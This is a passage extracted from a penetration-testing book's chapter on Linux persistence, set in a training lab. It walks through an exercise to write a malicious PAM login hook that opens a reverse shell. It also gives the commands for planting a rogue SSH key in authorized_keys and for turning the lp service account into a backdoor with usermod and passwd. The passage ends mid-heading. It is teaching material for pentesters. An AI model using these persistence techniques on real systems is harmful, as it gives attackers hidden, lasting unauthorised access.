@@ -1,0 +1,75 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 19 - Exercise 19: Coding a Malicious pam_exec Bash Script
+The previous section explained how to modify a system’s PAM configuration to call an external script, pam-helper.sh. This script will run whenever a user logs in to or out of the system.
+Build the script’s logic to take malicious actions of your choice. For example, you could use Cron to schedule a persistent task or use At to schedule a one-time task that establishes a reverse shell to a remote machine.
+Make sure to save your script into /usr/local/pam-helper.sh with executable permissions. You can test this exercise on p-jumpbox-01 (172.16.10.13) since you already have root access to it. Don’t forget to set up the reverse shell listener as well.
+Security Relevance Score: 5
+Word Count: 930
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Exercise 19: Coding a Malicious pam_exec Bash Script
+The previous section explained how to modify a system’s PAM configuration to call an external script, pam-helper.sh. This script will run whenever a user logs in to or out of the system.
+Build the script’s logic to take malicious actions of your choice. For example, you could use Cron to schedule a persistent task or use At to schedule a one-time task that establishes a reverse shell to a remote machine.
+Make sure to save your script into /usr/local/pam-helper.sh with executable permissions. You can test this exercise on p-jumpbox-01 (172.16.10.13) since you already have root access to it. Don’t forget to set up the reverse shell listener as well.
+
+
+Generating Rogue SSH Keys
+Users with SSH access to a server can use their cryptographic keys instead of their passwords to log in. When we generate an SSH key pair, we must append the public key to a file named authorized_keys under the user’s home directory. Any public key in this file is authorized to authenticate to the system but only when using the account for which the key exists.
+Because more than one key could be authorized to authenticate, using a rogue SSH key to create a backdoor to an account is as easy as adding another public key to this file. For example, an authorized_keys file for a nostarch user might look like the following, assuming their home directory is /home/nostarch:
+$ cat /home/nostarch/.ssh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB9Rp0Lol7dmnNxiMSlcWXWp5Ruf4XLwo2fgR7ZD
+djMNHIJtbmTXz4WLM34XagYaDFpqsghbE+kYM9HatmK7KY9HDTqC96fX0TW8ky8UChdSvB7oiQjEei
+CRuiqWqarPja6S8ko0LjdAe65n59kT2ClFCKP5XlGgkv/zMpLIfQxyrI4LFGun/Pi+Nef0DfNioBdZ
+lUAmWeOjHyJ+xdpHMdhJSHGuzNx0KRnzZ83mvhgXZAGcr7Pz1NMGxXhjx2TeQzV7Yek+Z2QY6LMFpQ
+e0c8AAvr/bI7+nj0wb27fhM66sOJp+VL+E4vg2t6TaGmrnq5JOG7lbIpXU/BU2KZaSx2E9bDzq5eOi
+AQc8j+WE6Y1Y7r/0pbZ5DuQHoowCzS6r9nX9NU0kI4W9mLQ1vx3mgOUu4eEDF579UX4CIj7nju8ebg
+wHhBaNdaYfmAz5TYgO4P92oqUNoyEm/eyndghpGWkn1U9yuzzCjiQqxpOV6V6Dw0DAyviHta5pYAjX
+CtsYM=
+
+To generate a new SSH key, run this command on your Kali machine:
+$ ssh-keygen -t rsa -C ""
+We use -t (type) to define the type of key (in this case, RSA) and -C (comment) with an empty value. If you don’t supply the -C flag with an empty value, ssh-keygen will append the computer’s hostname to the end of the key as a comment, which is a way to identify the machine that the key belongs to. Follow the wizard, making sure not to set a passphrase for the purposes of this example. Two files should be created: id_rsa (the private key) and id_rsa.pub (the public key).
+You can add the public key to authorized_keys in multiple ways. Try performing these steps on the p-jumpbox-01 machine (172.16.10.13) while logged in as the backup user.
+First, you can simply create or modify ~/.ssh/authorized_keys by using a text editor and pasting the public key’s content:
+$ mkdir ~/.ssh && chmod 700 ~/.ssh
+$ touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+
+To add the key remotely, you could use an SSH client to authenticate and run a command. Note that this will require you to provide the password of the account you’ve managed to compromise.
+$ cat id_rsa.pub | ssh backup@172.16.10.13 'cat >> .ssh/authorized_keys'
+The ssh-copy-id command makes it slightly easier to copy the public key to the server. It should automatically write it to the correct location:
+$ ssh-copy-id -i ~/.ssh/id_rsa.pub backup@172.16.10.13
+When prompted, enter the password for the backup user.
+After adding the key, try using the private RSA key to log in to the server:
+$ ssh backup@172.16.10.13 -i ~/.ssh/id_rsa
+You should notice that you’re not prompted to enter the user’s account password. If you had provided a passphrase during key creation, you’d be required to provide this passphrase when using the key for authentication.
+
+
+Repurposing Default System Accounts
+By default, systems come with built-in accounts other than root, such as nobody, sys, sync, bin, games, and man. We call these accounts service accounts, as they’re used for running specific tasks. Separating these tasks into different accounts enforces a least-privilege model, as it enables the system to run applications under particular user contexts.
+These accounts aren’t meant for users to log in to, and if you look closely at /etc/passwd on any of the lab machines (or even on Kali), you’ll see they usually have no shell or password set. These common hardening practices ensure that they can’t perform system tasks such as job scheduling if compromised.
+But if you’ve compromised a machine and gained access to a root account (or a sudo user with the ability to create or modify users), you could take measures such as the following to craft a backdoor mechanism that blends into the environment:
+
+Creating a new account that looks similar to a service account
+Modifying an existing service account by adding a shell and password to it
+
+Let’s convert a service account into a backdoor account that grants us ongoing access to the system. We’ll target the p-jumpbox-01 machine (172.16.10.13), where we have root access.
+We’ll backdoor the lp account, which is usually used for managing spooling services. You can see this account and its default shell in /etc/passwd:
+$ grep lp /etc/passwd
+
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+
+As you can see, the account has the /usr/sbin/nologin shell; this won’t allow us to log in. Let’s modify the default shell by using usermod and passing it the -s (shell) argument:
+# usermod -s /bin/bash lp
+We recommend learning more about the usermod command by running man usermod. Next, set a password with the passwd command and enter a password when prompted:
+# passwd lp
+Finally, check that you can SSH into the server by using the lp account:
+$ ssh lp@172.16.10.13
+You should be able to remotely connect to the machine by using this service account, which should now have a valid shell. You can use this as a backdoor account if you lose root access in the future, or if the root account is disabled for remote logins.
+
+
+Poisoning Bash Environment Files
+In
